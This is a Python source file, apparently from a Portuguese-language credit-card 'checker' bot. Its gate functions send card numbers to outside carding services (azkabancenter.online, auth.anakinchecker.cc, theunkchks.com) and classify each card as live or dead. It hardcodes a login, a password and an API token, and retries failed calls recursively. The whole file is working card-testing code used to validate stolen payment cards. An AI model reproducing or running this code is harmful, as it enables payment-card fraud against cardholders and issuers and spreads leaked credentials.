"""
Funções de gates.

As funções aqui retornam uma tupla contendo:
  O status (True, False, None).
  A gate que foi checada (Ruby_03, W4rlock, etc).
"""

import json
import random
import traceback
from json.decoder import JSONDecodeError
from typing import Optional, Tuple

import httpx

from utils import hc


class GateOffError(Exception):
    pass

async def azkaban(card) -> Tuple[Optional[bool], str]:
    gate = "azkaban"
    user, password = ("AnakinSA", "Vitor@2002@2002")
    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://azkabancenter.online/azkabandev.php",
            params=dict(
                lista=card, usuario=user, senha=password, testador="full2-getnet"
            ),
        )

        rjson = rt.json()
    except:
        return await w4rlock_check_full(card)

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("success") is True
        else False
        if rjson.get("success") is False
        else None
    )

    return rcode, gate

async def pre_auth(card: str) -> Tuple[Optional[bool], str]:
    gate = "pre-auth"
    token = "pladix"
    rj = {}
    print(f"[GATE_{gate}][{card}] Checking cc...")
    try:
        rt = await hc.get(f"https://auth.anakinchecker.cc/storebot/test.php", params=dict(lista=card))
        rj = rt.json()
    except:
        return await pre_auth(card)

    print(f"[GATE_{gate}][{card}] {rj}")

    rcode = (
        True
        if rj.get("status") == "live"
        else False
        if rj.get("status") == "die"
        else None
    )

    return (rcode, gate)

async def Infinito(card: str, value: int = 0) -> Tuple[Optional[bool], str]:
    gate = "Infinito" + ("_pre-auth" if value == 0 else "_debit")

    token = "425aceeb48bfaeeaef9c1de22b938712"

    print(f"[GATE_{gate}][{card}] Checking cc...")

    try:
        rt = await hc.get(
            "https://theunkchks.com/dashboard/checkers/getApiBot/api.php",
            params=dict(lista=card, chave=token),
        )

        rjson = rt.json()
    except:
        return await Infinito(card)

    print(f"[GATE_{gate}][{card}] {rjson}")

    rcode = (
        True
        if rjson.get("success") is True
        else False
        if rjson.get("success") is False
        else None
    )

    return rcode, gate